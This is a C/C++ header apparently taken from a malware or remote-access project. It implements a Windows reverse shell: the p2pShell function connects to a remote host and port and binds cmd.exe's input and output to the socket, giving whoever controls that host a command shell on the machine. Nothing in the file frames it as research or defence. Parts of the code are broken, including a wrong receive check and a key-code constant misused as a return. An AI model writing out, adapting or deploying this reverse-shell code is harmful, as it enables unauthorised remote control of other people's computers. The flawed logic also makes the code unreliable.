#pragma once
#define _WIN32_WINNT 0x501
#include "includes.h"
// -lws2_32 || -lwsock32

void p2pShell(const char* remoteAddr, int remotePort) {

    SOCKET lsock;
    sockaddr_in addr;
    WSAData version;
    WSAStartup(MAKEWORD(2, 2), &version);
    lsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(remoteAddr);
    addr.sin_port = htons(remotePort);

    struct hostent *hp = gethostbyname(remoteAddr);
    if (hp==NULL) {
        VK_RETURN;
    }
    int i=0;
    while ( hp->h_addr_list[i] != 0 ) {
        addr.sin_addr.s_addr = *(u_long *) hp->h_addr_list[i++];
    }
    while (true) {
        if (WSAConnect(lsock, (sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(lsock);
            WSACleanup();
            return;
        } else {
            char recvData[BUFFER];
            ZeroMemory(&recvData, sizeof(recvData));
            int recvStat = recv(lsock, recvData, BUFFER, 0);
            if (recvData <= 0) {
                closesocket(lsock);
                WSACleanup();
                continue;
            } else {
                char proc[] = "C:\\Windows\\system32\\cmd.exe";
                STARTUPINFO sInfo;
                PROCESS_INFORMATION pInfo;
                ZeroMemory(&sInfo, sizeof(sInfo));
                sInfo.cb = sizeof(sInfo);
                sInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)lsock;
                CreateProcessA(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
                WaitForSingleObject(pInfo.hProcess, INFINITE);
                CloseHandle(pInfo.hProcess);
                CloseHandle(pInfo.hThread);
                ZeroMemory(&recvData, sizeof(recvData));
                int recvCode = recv(lsock, recvData, BUFFER, 0);
                if (recvCode <= 0) {
                    closesocket(lsock);
                    WSACleanup();
                    return;
                }
            }
        }
    }
    return;
}
